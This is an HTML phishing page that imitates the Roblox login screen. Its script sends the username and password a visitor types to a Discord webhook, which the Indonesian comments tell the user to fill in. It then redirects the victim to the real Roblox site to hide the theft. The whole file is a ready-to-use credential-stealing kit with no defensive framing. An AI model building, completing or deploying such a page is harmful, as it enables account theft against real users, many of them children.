<!DOCTYPE html>
<html>
<head>
    <title>Roblox - Login</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-image: url('https://tr.rbxcdn.com/7d8d06a9b9c8beb9a1a2b5a9f9d8d8d9/420/420/Image/Png');
            background-size: cover;
        }
        
        .login-container {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            width: 350px;
            padding: 25px;
            text-align: center;
        }
        
        .logo {
            width: 180px;
            margin-bottom: 20px;
        }
        
        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #333;
        }
        
        input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        
        button {
            background-color: #00a2ff;
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        
        button:hover {
            background-color: #0088cc;
        }
        
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #777;
        }
        
        .error-message {
            color: red;
            font-size: 14px;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://tr.rbxcdn.com/7d8d06a9b9c8beb9a1a2b5a9f9d8d8d9/420/420/Image/Png" alt="Roblox Logo" class="logo">
        
        <div class="input-group">
            <label for="username">Username</label>
            <input type="text" id="username" placeholder="Username/Email/Phone" required>
        </div>
        
        <div class="input-group">
            <label for="password">Password</label>
            <input type="password" id="password" placeholder="Password" required>
        </div>
        
        <button id="loginButton">Login</button>
        
        <div class="error-message" id="errorMessage">
            Incorrect username or password. Please try again.
        </div>
        
        <div class="footer">
            <a href="#" style="color: #00a2ff;">Forgot password?</a> • <a href="#" style="color: #00a2ff;">Sign up</a>
        </div>
    </div>

    <script>
        document.getElementById('loginButton').addEventListener('click', function() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (!username || !password) {
                document.getElementById('errorMessage').style.display = 'block';
                return;
            }
            
            // Ganti WEBHOOK_URL_DISCORD dengan webhook Discord Anda
            const webhookUrl = 'WEBHOOK_URL_DISCORD';
            
            const data = {
                content: `**Roblox Credentials Captured**\nUsername: ${username}\nPassword: ${password}\nIP: ${window.location.hostname}`,
                embeds: [{
                    title: "New Credentials Captured",
                    color: 0xFF0000,
                    fields: [
                        { name: "Username", value: username },
                        { name: "Password", value: password },
                        { name: "Timestamp", value: new Date().toLocaleString() }
                    ]
                }]
            };
            
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            })
            .then(response => {
                if (response.ok) {
                    // Redirect ke halaman Roblox asli setelah 2 detik
                    document.getElementById('errorMessage').style.display = 'none';
                    document.getElementById('loginButton').textContent = 'Logging in...';
                    setTimeout(() => {
                        window.location.href = 'https://www.roblox.com/home';
                    }, 2000);
                }
            });
        });
    </script>
</body>
</html>
